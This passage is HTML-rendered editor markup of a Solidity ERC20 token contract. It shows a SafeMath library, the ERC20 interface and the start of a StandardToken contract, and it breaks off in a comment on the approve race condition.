role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * @dev Math operations with safety checks</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">library</span> <span class="cm-variable">SafeMath</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Multiplies two numbers, throws on overflow.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">mul</span>(<span class="cm-def">uint256</span> <span class="cm-variable">_a</span>, <span class="cm-variable-2">uint256</span> <span class="cm-variable">_b</span>) <span class="cm-variable">internal</span> <span class="cm-variable">pure</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span> <span class="cm-variable">c</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// Gas optimization: this is cheaper than asserting 'a' not being zero, but the</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// benefit is lost if 'b' is also tested.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable">_a</span> <span class="cm-operator">==</span> <span class="cm-number">0</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-number">0</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">c</span> <span class="cm-operator">=</span> <span class="cm-variable">_a</span> <span class="cm-operator">*</span> <span class="cm-variable">_b</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">assert</span>(<span class="cm-variable">c</span> <span class="cm-operator">/</span> <span class="cm-variable">_a</span> <span class="cm-operator">==</span> <span class="cm-variable">_b</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">c</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Integer division of two numbers, truncating the quotient.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">div</span>(<span class="cm-def">uint256</span> <span class="cm-variable">_a</span>, <span class="cm-variable-2">uint256</span> <span class="cm-variable">_b</span>) <span class="cm-variable">internal</span> <span class="cm-variable">pure</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// assert(_b &gt; 0); // Solidity automatically throws when dividing by 0</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// uint256 c = _a / _b;</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">_a</span> <span class="cm-operator">/</span> <span class="cm-variable">_b</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">sub</span>(<span class="cm-def">uint256</span> <span class="cm-variable">_a</span>, <span class="cm-variable-2">uint256</span> <span class="cm-variable">_b</span>) <span class="cm-variable">internal</span> <span class="cm-variable">pure</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">assert</span>(<span class="cm-variable">_b</span> <span class="cm-operator">&lt;=</span> <span class="cm-variable">_a</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">_a</span> <span class="cm-operator">-</span> <span class="cm-variable">_b</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Adds two numbers, throws on overflow.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">add</span>(<span class="cm-def">uint256</span> <span class="cm-variable">_a</span>, <span class="cm-variable-2">uint256</span> <span class="cm-variable">_b</span>) <span class="cm-variable">internal</span> <span class="cm-variable">pure</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span> <span class="cm-variable">c</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">c</span> <span class="cm-operator">=</span> <span class="cm-variable">_a</span> <span class="cm-operator">+</span> <span class="cm-variable">_b</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">assert</span>(<span class="cm-variable">c</span> <span class="cm-operator">&gt;=</span> <span class="cm-variable">_a</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">c</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * @dev ERC20 interface</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">ERC20</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">totalSupply</span>() <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">balanceOf</span>(<span class="cm-def">address</span> <span class="cm-variable">_who</span>) <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">allowance</span>(<span class="cm-def">address</span> <span class="cm-variable">_owner</span>, <span class="cm-variable-2">address</span> <span class="cm-variable">_spender</span>) <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">transfer</span>(<span class="cm-def">address</span> <span class="cm-variable">_to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">approve</span>(<span class="cm-def">address</span> <span class="cm-variable">_spender</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">transferFrom</span>(<span class="cm-def">address</span> <span class="cm-variable">_from</span>, <span class="cm-variable-2">address</span> <span class="cm-variable">_to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">event</span> <span class="cm-variable">Transfer</span>(<span class="cm-variable">address</span> <span class="cm-variable">indexed</span> <span class="cm-variable">from</span>, <span class="cm-variable">address</span> <span class="cm-variable">indexed</span> <span class="cm-variable">to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">event</span> <span class="cm-variable">Approval</span>(<span class="cm-variable">address</span> <span class="cm-variable">indexed</span> <span class="cm-variable">owner</span>, <span class="cm-variable">address</span> <span class="cm-variable">indexed</span> <span class="cm-variable">spender</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> * @dev Standard Token in ERC20</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">contract</span> <span class="cm-variable">StandardToken</span> <span class="cm-variable">is</span> <span class="cm-variable">ERC20</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">using</span> <span class="cm-variable">SafeMath</span> <span class="cm-keyword">for</span> <span class="cm-variable">uint256</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">string</span> <span class="cm-variable">public</span> <span class="cm-variable">name</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">string</span> <span class="cm-variable">public</span> <span class="cm-variable">symbol</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">uint8</span> <span class="cm-variable">public</span> <span class="cm-variable">decimals</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">uint256</span> <span class="cm-variable">public</span> <span class="cm-variable">totalSupply</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">address</span> <span class="cm-variable">public</span> <span class="cm-variable">owner</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">mapping</span>(<span class="cm-def">address</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable">uint256</span>) <span class="cm-variable">balances</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">mapping</span> (<span class="cm-def">address</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable">mapping</span> (<span class="cm-def">address</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable">uint256</span>)) <span class="cm-variable">internal</span> <span class="cm-variable">allowed</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp; &nbsp; * @dev init token's propertities</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp; &nbsp; */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">constructor</span>(<span class="cm-variable">uint256</span> <span class="cm-variable">_initialSupply</span>, <span class="cm-variable">string</span> <span class="cm-variable">_tokenName</span>, <span class="cm-variable">uint8</span> <span class="cm-variable">_decimalUnits</span>, <span class="cm-variable">string</span> <span class="cm-variable">_tokenSymbol</span>) <span class="cm-variable">public</span> {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">=</span> <span class="cm-variable">_initialSupply</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// Give the creator all initial tokens</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">totalSupply</span> <span class="cm-operator">=</span> <span class="cm-variable">_initialSupply</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-comment">// Update total supply</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span> <span class="cm-operator">=</span> <span class="cm-variable">_tokenName</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// Set the name for display purposes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">symbol</span> <span class="cm-operator">=</span> <span class="cm-variable">_tokenSymbol</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// Set the symbol for display purposes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">decimals</span> <span class="cm-operator">=</span> <span class="cm-variable">_decimalUnits</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-comment">// Amount of decimals for display purposes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">owner</span> <span class="cm-operator">=</span> <span class="cm-variable">msg</span>.<span class="cm-property">sender</span>; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-comment">// Set the owner</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Total number of tokens in existence</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">totalSupply</span>() <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">totalSupply</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Gets the balance of the specified address.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _owner The address to query the the balance of.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @return An uint256 representing the amount owned by the passed address.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">balanceOf</span>(<span class="cm-def">address</span> <span class="cm-variable">_owner</span>) <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">balances</span>[<span class="cm-variable">_owner</span>];</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Function to check the amount of tokens that an owner allowed to a spender.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _owner address The address which owns the funds.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _spender address The address which will spend the funds.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @return A uint256 specifying the amount of tokens still available for the spender.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">allowance</span>(<span class="cm-def">address</span> <span class="cm-variable">_owner</span>, <span class="cm-variable-2">address</span> <span class="cm-variable">_spender</span>) <span class="cm-variable">public</span> <span class="cm-variable">view</span> <span class="cm-variable">returns</span> (<span class="cm-variable">uint256</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable">allowed</span>[<span class="cm-variable">_owner</span>][<span class="cm-variable">_spender</span>];</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Transfer token for a specified address</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _to The address to transfer to.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @param _value The amount to be transferred.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  */</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">function</span> <span class="cm-def">transfer</span>(<span class="cm-def">address</span> <span class="cm-variable">_to</span>, <span class="cm-variable">uint256</span> <span class="cm-variable">_value</span>) <span class="cm-variable">public</span> <span class="cm-variable">returns</span> (<span class="cm-variable">bool</span>) {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">_value</span> <span class="cm-operator">&lt;=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>], <span class="cm-string">"balance is unsufficient."</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">require</span>(<span class="cm-variable">_to</span> <span class="cm-operator">!=</span> <span class="cm-variable">address</span>(<span class="cm-number">0</span>), <span class="cm-string">"target address is invalid."</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>] <span class="cm-operator">=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>].<span class="cm-property">sub</span>(<span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">balances</span>[<span class="cm-variable">_to</span>] <span class="cm-operator">=</span> <span class="cm-variable">balances</span>[<span class="cm-variable">_to</span>].<span class="cm-property">add</span>(<span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">emit</span> <span class="cm-variable">Transfer</span>(<span class="cm-variable">msg</span>.<span class="cm-property">sender</span>, <span class="cm-variable">_to</span>, <span class="cm-variable">_value</span>);</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-atom">true</span>;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-comment">/**</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * Beware that changing an allowance with this method brings the risk that someone may use both the old</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"> &nbsp;  * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:</span></span></pre><pre 